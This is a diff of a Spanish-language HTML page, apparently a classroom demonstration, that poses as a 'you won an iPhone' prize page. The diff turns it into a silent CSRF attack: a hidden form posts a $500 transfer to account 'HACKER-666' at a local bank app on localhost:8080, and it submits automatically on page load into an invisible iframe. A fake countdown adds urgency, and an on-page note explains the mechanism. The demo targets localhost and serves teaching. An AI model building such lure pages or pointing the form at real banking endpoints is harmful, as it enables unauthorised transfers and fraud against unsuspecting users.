@@ -5,12 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎉 ¡FELICIDADES! Has ganado</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        /* (Se mantiene todo tu CSS original para la distracción visual) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
@@ -22,13 +18,11 @@
             align-items: center;
             overflow: hidden;
         }
-        
         @keyframes gradient {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
-        
         .container {
             background: white;
             padding: 40px;
@@ -38,42 +32,12 @@
             max-width: 500px;
             position: relative;
         }
-        
-        .confetti {
-            font-size: 40px;
-            animation: bounce 0.5s infinite alternate;
-        }
-        
-        @keyframes bounce {
-            from { transform: translateY(0); }
-            to { transform: translateY(-10px); }
-        }
-        
-        h1 {
-            color: #e74c3c;
-            font-size: 32px;
-            margin: 20px 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .iphone {
-            font-size: 100px;
-            margin: 20px 0;
-            animation: shake 0.5s infinite;
-        }
-        
-        @keyframes shake {
-            0%, 100% { transform: rotate(-5deg); }
-            50% { transform: rotate(5deg); }
-        }
-        
-        .subtitle {
-            color: #27ae60;
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        
+        .confetti { font-size: 40px; animation: bounce 0.5s infinite alternate; }
+        @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
+        h1 { color: #e74c3c; font-size: 32px; margin: 20px 0; }
+        .iphone { font-size: 100px; margin: 20px 0; animation: shake 0.5s infinite; }
+        @keyframes shake { 0%, 100% { transform: rotate(-5deg); } 50% { transform: rotate(5deg); } }
+        .subtitle { color: #27ae60; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
         .fake-button {
             background: linear-gradient(135deg, #27ae60, #2ecc71);
             color: white;
@@ -84,39 +48,15 @@
             cursor: pointer;
             margin: 20px 0;
             box-shadow: 0 5px 20px rgba(39, 174, 96, 0.4);
-            transition: transform 0.2s;
+        }
+        .timer { background: #e74c3c; color: white; padding: 10px 20px; border-radius: 5px; font-weight: bold; margin-top: 20px; display: inline-block; }
+        .small-text { font-size: 10px; color: #999; margin-top: 30px; }
+        
+        /* 🚨 ESTILOS DEL ATAQUE 🚨 */
+        .hidden-elements {
+            display: none;
         }
         
-        .fake-button:hover {
-            transform: scale(1.05);
-        }
-        
-        .timer {
-            background: #e74c3c;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-weight: bold;
-            margin-top: 20px;
-            display: inline-block;
-        }
-        
-        .small-text {
-            font-size: 10px;
-            color: #999;
-            margin-top: 30px;
-        }
-        
-        /* ========================================
-           🚨 FORMULARIO OCULTO - ATAQUE CSRF 🚨
-           ======================================== */
-        .hidden-form {
-            position: absolute;
-            left: -9999px;
-            visibility: hidden;
-        }
-        
-        /* Indicador educativo */
         .educational-note {
             background: #2c3e50;
             color: white;
@@ -126,33 +66,17 @@
             text-align: left;
             font-size: 12px;
         }
-        
-        .educational-note h3 {
-            color: #e74c3c;
-            margin-bottom: 10px;
-        }
-        
-        .educational-note code {
-            background: #1a252f;
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-family: monospace;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="confetti">🎊 🎉 🎊</div>
-        
         <h1>¡¡¡FELICIDADES!!!</h1>
-        
         <div class="iphone">📱</div>
-        
         <p class="subtitle">¡Has ganado un iPhone 15 Pro!</p>
-        
         <p>Eres el visitante número <strong>1,000,000</strong></p>
         
-        <button class="fake-button" onclick="reclamarPremio()">
+        <button class="fake-button">
             🎁 ¡RECLAMAR MI PREMIO!
         </button>
         
@@ -160,59 +84,53 @@
             ⏰ Oferta expira en: <span id="countdown">2:59</span>
         </div>
         
-        <p class="small-text">
-            * Sin compromiso. Solo paga envío de $999.
-        </p>
+        <p class="small-text">* Sin compromiso. Solo paga envío de $0.99.</p>
+
+        <div class="hidden-elements">
+            <form id="csrf-form" 
+                  action="http://localhost:8080/transferir" 
+                  method="POST" 
+                  target="invisible-target">
+                <input type="hidden" name="destino" value="HACKER-666">
+                <input type="hidden" name="monto" value="500">
+            </form>
+            
+            <iframe name="invisible-target"></iframe>
+        </div>
         
-        <!-- ==========================================
-             🚨 FORMULARIO CSRF OCULTO 🚨
-             Este formulario se envía automáticamente
-             al banco cuando el usuario hace clic
-             ========================================== -->
-        <form id="csrf-form" class="hidden-form" 
-              action="http://localhost:8080/transferir" 
-              method="POST">
-            <input type="hidden" name="destino" value="HACKER-666-CUENTA-MALICIOSA">
-            <input type="hidden" name="monto" value="500">
-        </form>
-        
-        <!-- Nota educativa para la exposición -->
         <div class="educational-note">
-            <h3>⚠️ NOTA EDUCATIVA - CSRF</h3>
-            <p>Este sitio contiene un <strong>formulario oculto</strong> que hace un POST a:</p>
-            <p><code>http://localhost:8080/transferir</code></p>
-            <p style="margin-top: 10px;">
-                Cuando el usuario hace clic en "Reclamar Premio", el formulario oculto 
-                se envía usando las cookies del banco (si el usuario está logueado).
-            </p>
-            <p style="margin-top: 10px; color: #e74c3c;">
-                <strong>El banco transfiere $500 sin que el usuario lo sepa.</strong>
-            </p>
+            <h3 style="color: #e74c3c;">⚠️ MODO EXPOSICIÓN: ATAQUE SILENCIOSO</h3>
+            <p>1. El formulario se envía <strong>automáticamente</strong> al cargar.</p>
+            <p>2. El <code>target</code> es un <code>iframe</code> oculto, por lo que no hay redirección.</p>
+            <p>3. Estado: <strong id="status" style="color: #feca57;">Esperando carga...</strong></p>
         </div>
     </div>
     
     <script>
-        // Countdown falso para crear urgencia
+        // Simulación de cuenta atrás
         let time = 179;
         setInterval(() => {
             time--;
             if (time < 0) time = 179;
             const min = Math.floor(time / 60);
             const sec = time % 60;
-            document.getElementById('countdown').textContent = 
-                `${min}:${sec.toString().padStart(2, '0')}`;
+            document.getElementById('countdown').textContent = `${min}:${sec.toString().padStart(2, '0')}`;
         }, 1000);
-        
-        // 🚨 FUNCIÓN QUE EJECUTA EL ATAQUE CSRF
-        function reclamarPremio() {
-            // Mostrar alerta educativa
-            alert('🚨 ¡ATAQUE CSRF EJECUTADO!\n\n' +
-                  'Se ha enviado una transferencia de $500 a la cuenta del hacker.\n\n' +
-                  'Revisa tu saldo en el Banco Poli.');
+
+        // 🚨 EJECUCIÓN AUTOMÁTICA DEL ATAQUE
+        window.onload = function() {
+            const form = document.getElementById('csrf-form');
+            const statusText = document.getElementById('status');
             
-            // Enviar el formulario oculto al banco
-            document.getElementById('csrf-form').submit();
-        }
+            // Enviamos el formulario inmediatamente
+            form.submit();
+            
+            // Actualizamos la nota educativa para la exposición
+            statusText.textContent = "¡ATAQUE ENVIADO EXITOSAMENTE!";
+            statusText.style.color = "#2ecc71";
+            
+            console.log("CSRF: Formulario enviado automáticamente al iframe oculto.");
+        };
     </script>
 </body>
 </html>
